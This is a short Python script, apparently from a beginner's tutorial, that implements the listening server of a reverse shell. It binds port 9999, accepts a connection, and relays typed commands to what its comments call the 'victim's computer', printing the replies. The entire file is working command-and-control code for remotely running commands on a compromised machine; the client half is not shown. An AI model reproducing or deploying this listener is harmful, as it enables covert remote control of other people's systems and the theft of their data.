import socket
import sys

# Create a socket (connect two computers)
def create_socket():
    try:
        global host
        global port
        global s # s as socket
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("socket ctreation errror " + str(msg))


# Binding the socket and listening for the connections
def bind_socket():
    try:
        global host
        global port
        global s # s as socket

        print("binding the port: " + str(port))

        s.bind((host,port))   # host and port are known as tupil in python, so we are them in this way
        s.listen(5)  # server should continously listen for the connection from other sytems



    except socket.error as msg:
        print("socket creation error " + str(msg) + "\n" + "Retrying ... ")
        bind_socket()



# a function for accepting the connection
# Establish connection with a client ans the socket must be listening
def socket_accept():
    conn, address = s.accept()    # this gives us two very important data in return: 1- an object of the connection and
                                  # 2- a list of ip address and the port
    print("Connection has been established" + "IP" + address[0], "| Port" + str(address[1]))
    send_commands(conn)
    conn.close()

# send commandS from our computer (server) to the client/victim's computer
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd))>0:         # the command formats are in bytes, so we use the encode to convert it
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")   #we change the format of the received data from bytes to string and 1024 is for save it completely
            print(client_response, end="")   # the end="" is to finalize the line and go to the next line


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
